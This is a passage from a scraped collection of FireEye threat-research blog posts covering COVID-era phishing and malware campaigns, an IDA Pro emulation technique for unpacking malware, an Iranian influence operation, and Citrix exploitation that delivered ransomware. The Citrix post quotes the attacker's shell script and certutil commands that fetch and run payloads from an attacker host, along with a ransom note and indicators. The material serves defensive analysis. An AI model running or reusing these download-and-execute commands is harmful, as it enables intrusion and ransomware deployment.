tuned for the FLARE Team’s next post where we will release solutions for the FLARE On Challenge ( www.flare-on.com ). Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/04/limited-shifts-in-cyber-threat-landscape-driven-by-covid-19.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2020-04-08",
                    "source": "www.fireeye.com"
                },
                "text": "Though COVID-19 has had enormous effects on our society and economy, its effects on the cyber threat landscape remain limited. For the most part, the same actors we have always tracked are behaving in the same manner they did prior to the crisis. There are some new challenges, but they are perceptible, and we—and our customers—are prepared to continue this fight through this period of unprecedented change. The significant shifts in the threat landscape we are currently tracking include: The sudden major increase in a remote workforce has changed the nature and vulnerability of enterprise networks. Threat actors are now leveraging COVID-19 and related topics in social engineering ploys. We anticipate increased collection by cyber espionage actors seeking to gather intelligence on the crisis. Healthcare operations, related manufacturing, logistics, and administration organizations, as well as government offices involved in responding to the crisis are increasingly critical and vulnerable to disruptive attacks such as ransomware. Information operations actors have seized on the crisis to promote narratives primarily to domestic or near-abroad audiences. Same Actors, New Content The same threat actors and malware families that we observed prior to the crisis are largely pursuing the same objectives as before the crisis, using many of the same tools. They are simply now leveraging the crisis as a means of social engineering. This pattern of behavior is familiar. Threat actors have always capitalized on major events and crises to entice users. Many of the actors who are now using this approach have been tracked for years. Ultimately, COVID-19 is being adopted broadly in social engineering approaches because it is has widespread, generic appeal, and there is a genuine thirst for information on the subject that encourages users to take actions when they might otherwise have been circumspect. We have seen it used by several cyber criminal and cyber espionage actors, and in underground communities some actors have created tools to enable effective social engineering exploiting the coronavirus pandemic. Nonetheless, COVID-19 content is still only used in two percent of malicious emails. For the time being, we do not believe this social engineering will be abetting. In fact, it is likely to take many forms as changes in policy, economics, and other unforeseen consequences manifest. Recently we predicted a spike in stimulus related social engineering , for example. Additionally, the FBI has recently released a press release anticipating a rise in COVID-19 related Business Email Compromise (BEC) scams. State Actors Likely Very Busy Given that COVID-19 is the undoubtedly the overwhelming concern of governments worldwide for the time being, we anticipated targeting of government, healthcare, biotech, and other sectors by cyber espionage actors. We have not yet observed an incident of cyber espionage targeting COVID-19 related information; however, it is often difficult to determine what information these actors are targeting. There has been at least one case reported publicly which we have not independently confirmed. We have seen state actors, such as those from Russia, China and North Korea, leverage COVID-19 related social engineering, but given wide interest in that subject, that does not necessarily indicate targeting of COVID-19 related information. Threat to Healthcare Though we have no reason to believe there is a sudden, elevated threat to healthcare, the criticality of these systems has probably never been greater, and thus the risk to this sector will be elevated throughout this crisis. The threat of disruption is especially disconcerting as it could affect the ability of these organizations to provide safe and timely care. This threat extends beyond hospitals to pharmaceutical companies, as well as manufacturing, administration and logistics organizations providing vital support. Additionally, many critical public health resources lie at the state and local level. Though there is some anecdotal evidence suggesting some ransomware actors are avoiding healthcare targets, we do not expect that all actors will practice this restraint. Additionally, an attack on state and local governments, which have been a major target of ransomware actors, could have a disruptive effect on treatment and prevention efforts. Remote Work The sudden and unanticipated shift of many workers to work from home status will represent an opportunity for threat actors. Organizations will be challenged to move quickly to ensure sufficient capacity, as well as that security controls and policies are in place. Disruptive situations can reduce morale and increase stress, leading to adverse behavior such as decreasing users’ reticence to open suspicious messages, and even increasing the risk of insider threats. Distractions while working at home can cause lowered vigilance in scrutinizing and avoiding suspicious content as workers struggle to balance work and home responsibilities at the same time. Furthermore, the rapid adoption of platforms will undoubtedly lead to security mistakes and attract the attention of the threat actors. Secure remote access will likely rely on use of VPNs and user access permissions and authentication procedures intended to limit exposure of proprietary data. Hardware and infrastructure protection should include ensuring full disk encryption on enterprise devices, maintaining visibility on devices through an endpoint security tool, and maintaining regular software updates. For more on this issue, see our blog post on the risks associated with remote connectivity . The Information Operations Threat We have seen information operations actors promote narratives associated with COVID-19 to manipulate primarily domestic or near-abroad audiences. We observed accounts in Chinese-language networks operating in support of the People's Republic of China (PRC), some of which we previously identified to be promoting messaging pertaining to the Hong Kong protests, shift their focus to praising the PRC's response to the COVID-19 outbreak, criticizing the response of Hong Kong medical workers and the U.S. to the pandemic, and covertly promoting a conspiracy theory that the U.S. was responsible for the outbreak of the coronavirus in Wuhan. We have also identified multiple information operations promoting COVID-19-related narratives that were aimed at Russian- and Ukrainian-speaking audiences, including some that we assess with high confidence are part of the broader suspected Russian influence campaign publicly referred to as \"Secondary Infektion,\" as well as other suspected Russian activity. These operations have included leveraging a false hacktivist persona to spread the conspiracy theory that the U.S. developed the coronavirus in a weapons laboratory in Central Asia, taking advantage of physical protests in Ukraine to push the narrative that Ukrainians repatriated from Wuhan will infect the broader Ukrainian population, and claiming that the Ukrainian healthcare system is ill-equipped to deal with the pandemic. Other operations alleged that U.S. government or military personnel were responsible for outbreaks of the coronavirus in various countries including Lithuania and Ukraine, or insisted that U.S. personnel would contribute to the pandemic's spread if scheduled multilateral military exercises in the region were to continue as planned. Outlook It is clear that adversaries expect us to be distracted by these overwhelming events. The greatest cyber security challenge posed by COVID-19 may be our ability to stay focused on the threats that matter most. An honest assessment of the cyber security implications of the pandemic will be necessary to make efficient use of resources limited by the crisis itself. For more information and resources that can help strengthen defenses, visit FireEye's \" Managing Through Change and Crisis \" site, which aggregates many resources to help organizations that are trying to navigate COVID-19 related security challenges. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/04/code-grafting-to-unpack-malware-in-emulation.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2020-04-07",
                    "source": "www.fireeye.com"
                },
                "text": "This blog post continues the FLARE script series with a discussion of patching IDA Pro database files (IDBs) to interactively emulate code. While the fastest way to analyze or unpack malware is often to run it, malware won’t always successfully execute in a VM. I use IDA Pro’s Bochs integration in IDB mode to sidestep tedious debugging scenarios and get quick results. Bochs emulates the opcodes directly from your IDB in a Bochs VM with no OS. Bochs IDB mode eliminates distractions like switching VMs, debugger setup, neutralizing anti-analysis measures, and navigating the program counter to the logic of interest. Alas, where there is no OS, there can be no loader or dynamic imports. Execution is constrained to opcodes found in the IDB. This precludes emulating routines that call imported string functions or memory allocators. Tom Bennett’s flare-emu ships with emulated versions of these, but for off-the-cuff analysis (especially when I don’t know if there will be a payoff), I prefer interactively examining registers and memory to adjust my tactics ad hoc. What if I could bring my own imported functions to Bochs like flare-emu does? I’ve devised such a technique, and I call it code grafting. In this post I’ll discuss the particulars of statically linking stand-ins for common functions into an IDB to get more mileage out of Bochs. I’ll demonstrate using this on an EVILNEST sample to unpack and dump next-stage payloads from emulated memory. I’ll also show how I copied a tricky call sequence from one IDB to another IDB so I could keep the unpacking process all in a single Bochs debug session. EVILNEST Scenario My sample (MD5 hash 37F7F1F691D42DCAD6AE740E6D9CAB63 which is available on VirusTotal ) was an EVILNEST variant that populates the stack with configuration data before calling an intermediate payload. Figure 1 shows this unusual call site. Figure 1: Call site for intermediate payload The code in Figure 1 executes in a remote thread within a hollowed-out iexplore.exe process; the malware uses anti-analysis tactics as well. I had the intermediate payload stage and wanted to unpack next-stage payloads without managing a multi-process debugging scenario with anti-analysis. I knew I could stub out a few function calls in the malware to run all of the relevant logic in Bochs. Here’s how I did it. Code Carving I needed opcodes for a few common functions to inject into my IDBs and emulate in Bochs. I built simple C implementations of selected functions and compiled them into one binary. Figure 2 shows some of these stand-ins. Figure 2: Simple implementations of common functions I compiled this and then used IDAPython code similar to Figure 3 to extract the function opcode bytes. Figure 3: Function extraction I curated a library of function opcodes in an IDAPython script as shown in Figure 4. The nonstandard function opcodes at the bottom of the figure were hand-assembled as tersely as possible to generically return specific values and manipulate the stack (or not) in conformance with calling conventions. Figure 4: Extracted function opcodes On top of simple functions like memcpy , I implemented a memory allocator. The allocator referenced global state data, meaning I couldn’t just inject it into an IDB and expect it to work. I read the disassembly to find references to global operands and templatize them for use with Python’s format method. Figure 5 shows an example for malloc . Figure 5: HeapAlloc template code I organized the stubs by name as shown in Figure 6 both to call out functions I would need to patch, and to conveniently add more function stubs as I encounter use cases for them. The mangled name I specified as an alias for free is operator delete . Figure 6: Function stubs and associated names To inject these functions into the binary, I wrote code to find the next available segment of a given size. I avoided occupying low memory because Bochs places its loader segment below 0x10000 . Adjacent to the code in my code  segment, I included space for the data used by my memory allocator. Figure 7 shows the result of patching these functions and data into the IDB and naming each location (stub functions are prefixed with stub_ ). Figure 7: Data and code injected into IDB The script then iterates all the relevant calls in the binary and patches them with calls to their stub implementations in the newly added segment. As shown in Figure 8, IDAPython’s Assemble function saved the effort of calculating the offset for the call operand manually. Note that the Assemble function worked well here, but for bigger tasks, Hex-Rays recommends a dedicated assembler such as Keystone Engine and its Keypatch plugin for IDA Pro. Figure 8: Abbreviated routine for assembling a call instruction and patching a call site to an import The Code Grafting script updated all the relevant call sites to resemble Figure 9, with the target functions being replaced by calls to the stub_ implementations injected earlier. This prevented Bochs in IDB mode from getting derailed when hitting these call sites, because the call operands now pointed to valid code inside the IDB. Figure 9: Patched operator new() call site Dealing with EVILNEST The debug scenario for the dropper was slightly inconvenient, and simultaneously, it was setting up a very unusual call site for the payload entry point. I used Bochs to execute the dropper until it placed the configuration data on the stack, and then I used IDAPython’s idc.get_bytes function to extract the resulting stack data. I wrote IDAPython script code to iterate the stack data and assemble push instructions into the payload IDB leading up to a call instruction pointing to the DLL’s export. This allowed me to debug the unpacking process from Bochs within a single session. I clicked on the beginning of my synthesized call site and hit F4 to run it in Bochs. I was greeted with the warning in Figure 10 indicating that the patched IDB would not match the depictions made by the debugger (which is untrue in the case of Bochs IDB mode). Bochs faithfully executed my injected opcodes producing exactly the desired result. Figure 10: Patch warning I watched carefully as the instruction pointer approached and passed the IsDebuggerPresent check. Because of the stub I injected ( stub_IsDebuggerPresent ), it passed the check returning zero as shown in Figure 11. Figure 11: Passing up IsDebuggerPresent I allowed the program counter to advance to address 0x1A1538 , just beyond the unpacking routine. Figure 12 shows the register state at this point which reflects a value in EAX that was handed out by my fake heap allocator and which I was about to visit. Figure 12: Running to the end of the unpacker and preparing to view the result Figure 13 shows that there was indeed an IMAGE_DOS_SIGNATURE (“MZ”) at this location. I used idc.get_bytes() to dump the unpacked binary from the fake heap location and saved it for analysis. Figure 13: Dumping the unpacked binary Through Bochs IDB mode, I was also able to use the interactive debugger interface of IDA Pro to experiment with manipulating execution and traversing a different branch to unpack another payload for this malware as well. Conclusion Although dynamic analysis is sometimes the fastest road, setting it up and navigating minutia detract from my focus, so I’ve developed an eye for routines that I can likely emulate in Bochs to dodge those distractions while still getting answers. Injecting code into an IDB broadens the set of functions that I can do this with, letting me get more out of Bochs. This in turn lets me do more on-the-fly experimentation, one-off string decodes, or validation of hypotheses before attacking something at scale. It also allows me to experiment dynamically with samples that won’t load correctly anyway, such as unpacked code with damaged or incorrect PE headers. I’ve shared the Code Grafting tools as part of the flare-ida GitHub repository . To use this for your own analyses: In IDA Pro’s IDAPython prompt, run code_grafter.py or import it as a module. Instantiate a CodeGrafter object and invoke its graftCodeToIdb() method: CodeGrafter().graftCodeToIdb() Use Bochs in IDB mode to conveniently execute your modified sample and experiment away! This post makes it clear just how far I’ll go to avoid breaking eye contact with IDA. If you’re a fan of using Bochs with IDA too, then this is my gift to you. Enjoy! Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/03/stimulus-bill-social-engineering-covid-19-financial-compensation-schemes.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2020-03-27",
                    "source": "www.fireeye.com"
                },
                "text": "Given the community interest and media coverage surrounding the economic stimulus bill currently being considered by the United States House of Representatives, we anticipate attackers will increasingly leverage lures tailored to the new stimulus bill and related recovery efforts such as stimulus checks, unemployment compensation and small business loans. Although campaigns employing themes relevant to these matters are only beginning to be adopted by threat actors, we expect future campaigns—primarily those perpetrated by financially motivated threat actors—to incorporate these themes in proportion to the media’s coverage of these topics. Threat actors with varying motivations are actively exploiting the current pandemic and public fear of the coronavirus and COVID-19. This is consistent with our expectations; malicious actors are typically quick to adapt their social engineering lures to exploit major flashpoints along with other recurrent events (e.g. holidays, Olympics). Security researchers at FireEye and in the broader community have already begun to identify and report on COVID-19 themed campaigns with grant, payment, or economic recovered themed emails and attachments. Example Malware Distribution Campaign On March 18, individuals at corporations across a broad set of industries and geographies received emails with the subject line “COVID-19 Payment” intended to distribute the SILENTNIGHT banking malware (also referred to by others as Zloader). Despite the campaign’s broad distribution, a plurality of associated messages were sent to organizations based in Canada. Interestingly, although the content of these emails was somewhat generic, they were sometimes customized to reference a payment made in currency relevant to the recipient’s geography and contextually relevant government officials (Figure 1 and Figure 2). These emails were sent from a large pool of different @gmx.com email addresses and had password protected Microsoft Word document attachments using the file name “COVID 19 Relief.doc” (Figure 3). The emails appear to be auto generated and follow the format <name>.<name><SevenNumberString>@gmx.com. When these documents were opened and macros enabled, they would drop and execute a .JSE script crafted to download and execute an instance of SILENTNIGHT from http://209.141.54[.]161/crypt18.dll. An analyzed sample of SILENTNIGHT downloaded from this URL had an MD5 hash of 9e616a1757cf1d40689f34d867dd742e, employed the RC4 key 'q23Cud3xsNf3', and was associated with the SILENTNIGHT botnet 'PLSPAM'. This botnet has been seen loading configuration files containing primarily U.S.- and Canada financial institution webinject targets. Furthermore, this sample was configured to connect to the following controller infrastructure: http://marchadvertisingnetwork4[.]com/post.php http://marchadvertisingnetwork5[.]com/post.php http://marchadvertisingnetwork6[.]com/post.php http://marchadvertisingnetwork7[.]com/post.php http://marchadvertisingnetwork8[.]com/post.php http://marchadvertisingnetwork9[.]com/post.php http://marchadvertisingnetwork10[.]com/post.php Figure 1: Example lure using CAD Figure 2: Example lure using AUD Figure 3: Malicious Word document Example Phishing Campaign Individuals at financial services organizations in the United States were sent emails with the subject line “Internal Guidance for Businesses Grant and loans in response to respond to COVID-19” (Figure 4). These emails had OpenDocument Presentation (.ODP) format attachments that, when opened in Microsoft PowerPoint or OpenOffice Impress, display a U.S. Small Business Administration (SBA) themed message (Figure 5) and an in-line link that redirects to an Office 365 phishing kit (Figure 6) hosted at https://tyuy56df-kind-giraffe-ok.mybluemix[.]net/. Figure 4: Email lure referencing business grants and loans Figure 5: SBA-themed message Figure 6: Office 365 phishing page Implications Malicious actors have always exploited users’ sense of urgency, fear, goodwill and mistrust to enhance their operations. The threat actors exploiting this crisis are not new, they are simply taking advantage of a particularly overtaxed target set that is urgently seeking new information. Users who are aware of this dynamic, and who approach any new information with cautious skepticism will be especially prepared to meet this challenge. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/02/information-operations-fabricated-personas-to-promote-iranian-interests.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2020-02-12",
                    "source": "www.fireeye.com"
                },
                "text": "In May 2019, FireEye Threat Intelligence published a blog post exposing a network of English-language social media accounts that engaged in inauthentic behavior and misrepresentation that we assessed with low confidence was organized in support of Iranian political interests. Personas in that network impersonated candidates for U.S. House of Representatives seats in 2018 and leveraged fabricated journalist personas to solicit various individuals, including real journalists and politicians, for interviews intended to bolster desired political narratives. Since the release of that blog post, we have continued to track activity that we believe to be part of that broader operation, reporting our findings to our intelligence customers using the moniker “Distinguished Impersonator.” Today, Facebook took action against a set of eleven accounts on the Facebook and Instagram platforms that they shared with us and, upon our independent review, we assessed were related to the broader Distinguished Impersonator activity set we’ve been tracking. We separately identified a larger set of just under 40 related accounts active on Twitter against which Twitter has also taken recent enforcement action. In this blog post, we provide insights into the recent activity and behavior of some of the personas in the Distinguished Impersonator network, in order to exemplify the tactics information operations actors are employing in their attempts to surreptitiously amplify narratives and shape political attitudes. Activity Overview Personas in the Distinguished Impersonator network have continued to engage in activity similar to that we previously reported on publicly in May 2019, including social media messaging directed at politicians and media outlets; soliciting prominent individuals including academics, journalists, and activists for “media” interviews; and posting what appear to be videoclips of interviews of unknown provenance conducted with such individuals to social media. The network has also leveraged authentic media content to promote desired political narratives, including the dissemination of news articles and videoclips from Western mainstream media outlets that happen to align with Iranian interests, and has amplified the commentary of real individuals on social media. Outside of impersonating prominent individuals such as journalists, other personas in the network have primarily posed as U.S. liberals, amplifying authentic content from other social media users broadly in line with that proclaimed political leaning, as well as material more directly in line with Iranian political interests, such as videoclips of a friendly meeting between U.S. President Trump and Crown Prince of Saudi Arabia Mohammad Bin Salman accompanied by pro-U.S. Democrat commentary, videoclips of U.S. Democratic presidential candidates discussing Saudi Arabia's role in the conflict in Yemen, and other anti-Saudi, anti-Israeli, and anti-Trump messaging. Some of this messaging has been directed at the social media accounts of U.S. politicians and media outlets (Figure 1). Figure 1: Twitter accounts in the Distinguished Impersonator network posting anti-Israeli, anti-Saudi, and anti-Trump content We observed direct overlap between six of the personas operating on Facebook platforms and those operating on Twitter. In one example of such overlap, the “Ryan Jensen” persona posted to both Twitter and Instagram a videoclip showing antiwar protests in the U.S. following the killing of Qasem Soleimani, commander of the Islamic Revolutionary Guards Corps’ Quds Force (IRGC-QF) by a U.S. airstrike in Baghdad in January 2020 (Figure 2). Notably, though the strike motivated some limited activity by personas in the network, the Distinguished Impersonator operation has been active since long before that incident. Figure 2: Posts by the “Ryan Jensen” persona on Twitter and Instagram disseminating a videoclip of antiwar protests in the U.S. following the killing of Qasem Soleimani Accounts Engaged in Concerted Replies to Influential Individuals on Twitter, Posed as Journalists and Solicited Prominent Individuals for “Media” Interviews Personas on Twitter that we assess to be a part of the Distinguished Impersonator operation engaged in concerted replies to tweets by influential individuals and organizations, including members of the U.S. Congress and other prominent political figures, journalists, and media outlets. The personas responded to tweets with specific narratives aligned with Iranian interests, often using identical hashtags. The personas sometimes also responded with content unrelated to the tweet they were replying to, again with messaging aligned with Iranian interests. For example, a tweet regarding a NASA mission received replies from personas in the network pertaining to Iran’s seizure of a British oil tanker in July 2019. Other topics the personas addressed included U.S.-imposed sanctions on Iran and U.S. President Trump’s impeachment (Figure 3). While it is possible that the personas may have conducted such activity in the hope of eliciting responses from the specific individuals and organizations they were replying to, the multiple instances of personas responding to seemingly random tweets with unrelated political content could also indicate an intent to reach the broader Twitter audiences following those prominent accounts. Figure 3: Twitter accounts addressing U.S.-imposed sanctions on Iran (left) and the Trump impeachment (right) Instagram accounts that we assess to be part of the Distinguished Impersonator operation subsequently highlighted this Twitter activity by posting screen recordings of an unknown individual(s) scrolling through the responses by the personas and authentic Twitter users to prominent figures’ tweets. The Instagram account @ryanjensen7722, for example, posted a video scrolling through replies to a tweet by U.S. Senator Cory Gardner commenting on “censorship and oppression.” The video included a reply posted by @EmilyAn1996, a Twitter account we have assessed to be part of the operation, discussing potential evidence surrounding President Trump’s impeachment trial. Figure 4: Screenshot of video posted by @ryanjensen7722 on Instagram scrolling through Twitter replies to a tweet by U.S. Senator Cory Gardner We also observed at least two personas posing as journalists working at legitimate U.S. media outlets openly solicit prominent individuals via Twitter, including Western academics, activists, journalists, and political advisors, for interviews (Figure 5). These individuals included academic figures from organizations such as the Washington Institute for Near East Policy and the Foreign Policy Research Institute, as well as well-known U.S. conservatives opposed to U.S. President Trump and a British MP. The personas solicited the individuals’ opinions regarding topics relevant to Iran’s political interests, such as Trump’s 2020 presidential campaign, the Trump administration’s relationship with Saudi Arabia, Trump’s “deal of the century,” referring to a peace proposal regarding the Israeli-Palestinian conflict authored by the Trump administration, and a tweet by President Trump regarding former UK Prime Minister Theresa May. Figure 5: The “James Walker” persona openly soliciting interviews from academics and journalists on Twitter Twitter Personas Posted Opinion Polls To Solicit Views on Topics Relevant to Iranian Political Interests Some of the personas on Twitter also posted opinion polls to solicit other users’ views on political topics, possibly for the purpose of helping to build a larger follower base through engagement. One account, @CavenessJim, posed the question: “Do you believe in Trump’s foreign policies especially what he wants to do for Israel which is called ‘the deal of the century’?” (The poll provided two options: “Yes, I do.” and “No, he cares about himself.” Of the 2,241 votes received, 99% of participants voted for the latter option, though we note that we have no visibility into the authenticity of those “voters”.) Another account, @AshleyJones524, responded to a tweet by U.S. Senator Lindsey Graham by posting a poll asking if the senator was “Trump’s lapdog,” tagging seven prominent U.S. politicians and one comedian in the post; all 24 respondents to the poll voted in the affirmative. As with the Instagram accounts’ showcasing of replies to the tweets of prominent individuals, Instagram accounts in the network also highlighted polls posted by the personas on Twitter (Figure 6). Figure 6: Twitter account @CavenessJim posts Twitter poll (left); Instagram account @ryanjensen7722 posts video highlighting @CavenessJim's Twitter poll (right) Videoclips of Interviews with U.S., U.K., and Israeli Individuals Posted on Iran-Based Media Outlet Tehran Times Similar to the personas we reported on in May 2019, some of the more recently active personas posted videoclips on Facebook, Instagram, and Twitter of interviews with U.S., UK, and Israeli individuals including professors, politicians, and activists expressing views on topics aligned with Iranian political interests (Figure 7). We have thus far been unable to determine the provenance of these interviews, and note that, unlike some of the previous cases we reported on in 2019, the personas in this more recent iteration of activity did not themselves proclaim to have conducted the interviews they promoted on social media. The videoclips highlighted the interviewees’ views on issues such as U.S. foreign policy in the Middle East and U.S. relations with its political allies. Notably, we observed that at least some of the videoclips that were posted by the personas to social media have also appeared on the website of the Iranian English-language media outlet Tehran Times , both prior to and following the personas' social media posts. In other instances, Tehran Times published videoclips that appeared to be different segments of the same interviews that were posted by Distinguished Impersonator personas. Tehran Times is owned by the Islamic Propagation Organization, an entity that falls under the supervision of the Iranian Supreme Leader Ali Khamenei. Figure 7: Facebook and Instagram accounts in the network posting videoclips of interviews with an activist and a professor Conclusion The activity we’ve detailed here does not, in our assessment, constitute a new activity set, but rather a continuation of an ongoing operation we believe is being conducted in support of Iranian political interests that we’ve been tracking since last year. It illustrates that the actors behind this operation continue to explore elaborate methods for leveraging the authentic political commentary of real individuals to furtively promote Iranian political interests online. The continued impersonation of journalists and the amplification of politically-themed interviews of prominent individuals also provide additional examples of what we have long referred to internally as the “media-IO nexus”, whereby actors engaging in online information operations actively leverage the credibility of the legitimate media environment to mask their activities, whether that be through the use of inauthentic news sites masquerading as legitimate media entities , deceiving legitimate media entities in order to promote desired political narratives , defacing media outlets’ websites to disseminate disinformation, spoofing legitimate media websites, or, as in this case, attempting to solicit commentary likely perceived as expedient to the actors’ political goals by adopting fake media personas. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/01/nice-try-501-ransomware-not-implemented.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2020-01-24",
                    "source": "www.fireeye.com"
                },
                "text": "An Ever-Evolving Threat Since January 10, 2020, FireEye has tracked extensive global exploitation of CVE-2019-19781, which continues to impact Citrix ADC and Gateway instances that are unpatched or do not have mitigations applied . We previously reported on attackers’ swift attempts to exploit this vulnerability and the post-compromise deployment of the previously unseen NOTROBIN malware family by one threat actor. FireEye continues to actively track multiple clusters of activity associated with exploitation of this vulnerability, primarily based on how attackers interact with vulnerable Citrix ADC and Gateway instances after identification. While most of the CVE-2019-19781 exploitation activity we’ve observed to this point has led to the deployment of coin miners or most commonly NOTROBIN, recent compromises suggest that this vulnerability is also being exploited to deploy ransomware. If your organization is attempting to assess whether there is evidence of compromise related to exploitation of CVE-2019-19781, we highly encourage you to use the IOC Scanner co-published by FireEye and Citrix , which detects the activity described in this post. Between January 16 and 17, 2020, FireEye Managed Defense detected the IP address 45[.]120[.]53[.]214 attempting to exploit CVE-2019-19781 at dozens of FireEye clients. When successfully exploited, we observed impacted systems executing the cURL command to download a shell script with the file name ld.sh from 45[.]120[.]53[.]214 (Figure 1). In some cases this same shell script was instead downloaded from hxxp://198.44.227[.]126:81/citrix/ld.sh . Figure 1: Snippet of ld.sh, downloaded from 45.120.53.214 The shell script, provided in Figure 2, searches for the python2 binary (Note: Python is only pre-installed on Citrix Gateway 12.x and 13.x systems) and downloads two additional files to the system: piz.Lan , a XOR-encoded data blob, and de.py , a Python script, to a temporary directory. This script then changes permissions and executes de.py , which subsequently decodes and decompresses piz.Lan . Finally, the script cleans up the initial staging files and executes scan.py , an additional script we will cover in more detail later in the post. #!/bin/sh rm $0 if [ ! -f \"/var/python/bin/python2\" ]; then echo 'Exit' exit fi mkdir /tmp/rAgn cd /tmp/rAgn curl hxxp://45[.]120[.]53[.]214/piz.Lan -o piz.Lan sleep 1 curl hxxp://45[.]120[.]53[.]214/de -o de.py chmod 777 de.py /var/python/bin/python2 de.py rm de.py rm piz.Lan rm .new.zip cd httpd /var/python/bin/python2 scan.py -n 50 -N 40 & Figure 2: Contents of ld.sh, a shell-script to download additional tools to the compromised system piz.Lan -> .net.zip Armed with the information gathered from de.py , we turned our attention to decoding and decompressing “ .net.zip ” (MD5: 0caf9be8fd7ba5b605b7a7b315ef17a0). Inside, we recovered five files, represented in Table 1: Filename Functionality MD5 x86.dll 32-bit Downloader 9aa67d856e584b4eefc4791d2634476a x64.dll 64-bit Downloader 55b40e0068429fbbb16f2113d6842ed2 scan.py Python socket scanner b0acb27273563a5a2a5f71165606808c xp_eternalblue.replay Exploit replay file 6cf1857e569432fcfc8e506c8b0db635 eternalblue.replay Exploit replay file 9e408d947ceba27259e2a9a5c71a75a8 Table 1: Contents of the ZIP file \".new.zip\", created by the script de.py The contents of the ZIP were explained via analysis of the file scan.py , a Python scanning script that would also automate exploitation of identified vulnerable system(s). Our initial analysis showed that this script was a combination of functions from multiple open source projects or scripts. As one example, the replay files, which were either adapted or copied directly from this public GitHub repository, were present in the Install_Backdoor function, as shown in Figure 3: Figure 3: Snippet of scan.py showing usage of EternalBlue replay files This script also had multiple functions checking whether an identified system is 32- vs. 64-bit, as well as raw shell code to step through an exploit. The exploit_main function, when called, would appropriately choose between 32- or 64-bit and select the right DLL for injection, as shown in Figure 4. Figure 4: Snippet of scan.py showing instructions to deploy 32- or 64-bit downloaders I Call Myself Ragnarok Our analysis continued by examining the capabilities of the 32- and 64-bit DLLs, aptly named x86.dll and x64.dll . At only 5,120 bytes each, these binaries performed the following tasks (Figure 5 and Figure 6): Download a file named patch32 or patch64 (respective to operating system bit-ness) from a hard-coded URL using certutil , a native tool used as part of Windows Certificate Services (categorized as Technique 11005 within MITRE’s ATT&CK framework ). Execute the downloaded binary since1969.exe , located in C:\\Users\\Public . Delete the URL from the current user’s certificate cache. certutil.exe -urlcache -split -f hxxp://45.120.53[.]214/patch32 C:/Users/Public/since1969.exe cmd.exe /c C:/Users/Public/since1969.exe certutil -urlcache -f hxxp://45.120.53[.]214/patch32 delete Figure 5: Snippet of strings from x86.dll certutil.exe -urlcache -split -f hxxp://45.120.53[.]214/patch64 C:/Users/Public/since1969.exe cmd.exe /c C:/Users/Public/since1969.exe certutil -urlcache -f hxxp://45.120.53[.]214/patch64 delete Figure 6: Snippet of strings from x64.dll Although neither patch32 nor patch64 were available at the time of analysis, FireEye identified a file on VirusTotal with the name avpass.exe (MD5: e345c861058a18510e7c4bb616e3fd9f) linked to the IP address 45[.]120[.]53[.]214 (Figure 8). This file is an instance of the publicly available Meterpreter backdoor that was uploaded on November 12, 2019. Additional analysis confirmed that this binary communicated to 45[.]120[.]53[.]214 over TCP port 1234. Figure 7: VirusTotal graph showing links between resources hosted on or communicating with 45.120.53.214 Within the avpass.exe binary, we found an interesting PDB string that provided more context about the tool’s author: “ C:\\Users\\ragnarok\\source\\repos\\avpass\\Debug\\avpass.pdb ”. Utilizing ragnarok as a keyword, we pivoted and were able to identify a separate copy of since1969.exe (MD5: 48452dd2506831d0b340e45b08799623) uploaded to VirusTotal on January 23, 2020. The binary’s compilation timestamp of January 16, 2020, aligns with our earliest detections associated with this threat actor. Further analysis and sandboxing of this binary brought all the pieces together—this threat actor may have been attempting to deploy ransomware aptly named ‘Ragnarok’. We’d like to give credit to this Tweet from Karsten Hahn, who identified ragnarok-related about artifacts on January 17, 2020, again aligning with the timeframe of our initial detection. Figure 8 provides a snippet of files created by the binary upon execution. Figure 8: Ragnarok-related ransomware files The ransom note dropped by this ransomware, shown in Figure 11, points to three email addresses. 6.it's wise to pay as soon as possible it wont make you more losses the ransome: 1 btcoin for per machine,5 bitcoins for all machines how to buy bitcoin and transfer? i think you are very good at googlesearch asgardmaster5@protonmail[.]com ragnar0k@ctemplar[.]com j.jasonm@yandex[.]com Attention:if you wont pay the ransom in five days, all of your files will be made public on internet and will be deleted Figure 9: Snippet of ransom note dropped by “since1969.exe” Implications FireEye continues to observe multiple actors who are currently seeking to take advantage of CVE-2019-19781. This post outlines one threat actor who is using multiple exploits to take advantage of vulnerable internal systems and move laterally inside the organization. Based on our initial observations, the ultimate intent may have been the deployment of ransomware, using the Gateway as a central pivot point. As previously mentioned, if suspect your Citrix appliances may have been compromised, we recommend utilizing the tool FireEye released in partnership with Citrix . Detect the Technique Aside from CVE-2019-19781, FireEye detects the activity described in this post across our platforms, including named detections for Meterpreter, and EternalBlue. Table 2 contains several specific detection names to assist in detection of this activity. Signature Name CERTUTIL.EXE DOWNLOADER (UTILITY) CURL Downloading Shell Script ETERNALBLUE EXPLOIT METERPRETER (Backdoor) METERPRETER URI (STAGER) SMB - ETERNALBLUE Table 2: FireEye Detections for activity described in this post Indicators Table 3 provides the unique indicators discussed in this post. Indicator Type Indicator Notes Network 45[.]120[.]53[.]214 Network 198[.]44[.]227[.]126 Host 91dd06f49b09a2242d4085703599b7a7 piz.Lan Host 01af5ad23a282d0fd40597c1024307ca de.py Host bd977d9d2b68dd9b12a3878edd192319 ld.sh Host 0caf9be8fd7ba5b605b7a7b315ef17a0 .new.zip Host 9aa67d856e584b4eefc4791d2634476a x86.dll Host 55b40e0068429fbbb16f2113d6842ed2 x64.dll Host b0acb27273563a5a2a5f71165606808c scan.py Host 6cf1857e569432fcfc8e506c8b0db635 xp_eternalblue.replay Host 9e408d947ceba27259e2a9a5c71a75a8 eternalblue.replay Host e345c861058a18510e7c4bb616e3fd9f avpass.exe Host 